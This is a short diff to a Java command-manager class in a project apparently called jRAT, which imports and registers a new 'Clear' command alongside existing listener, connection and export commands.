@@ -4,6 +4,7 @@ import java.util.ArrayList;
 import java.util.List;
 
 import net.jrat.core.command.commands.AddListener;
+import net.jrat.core.command.commands.Clear;
 import net.jrat.core.command.commands.ConnectionInfo;
 import net.jrat.core.command.commands.Exit;
 import net.jrat.core.command.commands.ExportFile;
@@ -35,6 +36,7 @@ public class CommandManager
 		this.commands.add(new ToggleListener());
 		this.commands.add(new ConnectionInfo());
 		this.commands.add(new ExportFile());
+		this.commands.add(new Clear());
 		this.commands.add(new Exit());
 
 		this.commands.add(new SetConnection());
